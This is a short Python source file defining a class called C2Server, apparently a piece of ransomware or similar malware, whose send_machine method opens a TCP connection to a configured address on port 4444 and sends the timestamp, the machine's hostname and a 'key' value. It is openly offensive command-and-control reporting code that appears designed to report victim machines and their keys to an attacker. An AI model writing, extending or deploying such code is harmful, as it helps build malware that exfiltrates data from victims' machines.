import os
from datetime import datetime
import socket

class C2Server():
    def __init__(self) -> None:
        self.ip = "127.0.0.1"
        self.port = 4444
    
    def send_machine(self, key):
        hostname = os.uname()[1]
        timestamp = datetime.now()
        
        try:
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                s.connect((self.ip, self.port))
                s.send(f"[{timestamp}] - {hostname}:{key}\n".encode("utf-8"))
                print(f"[+] Machine Submited: {hostname}")
        except:
            print(f"[X] Machine Not Submited: {hostname}")
